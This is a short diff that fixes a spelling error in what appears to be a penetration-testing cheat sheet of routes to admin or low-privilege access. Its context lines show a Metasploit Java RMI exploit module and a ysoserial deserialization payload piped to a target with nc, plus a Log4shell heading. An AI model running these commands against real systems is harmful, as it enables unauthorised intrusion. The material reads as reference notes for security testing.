@@ -14,7 +14,7 @@
 ## Java RMI >>> Admin || Low access
 - `msf> use exploit/multi/misc/java_rmi_server`
 
-## Java Serialiszed port >>> Admin || Low access
+## Java Serialized port >>> Admin || Low access
 - `ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>`
 
 ## Log4shell >>> Admin || Low access
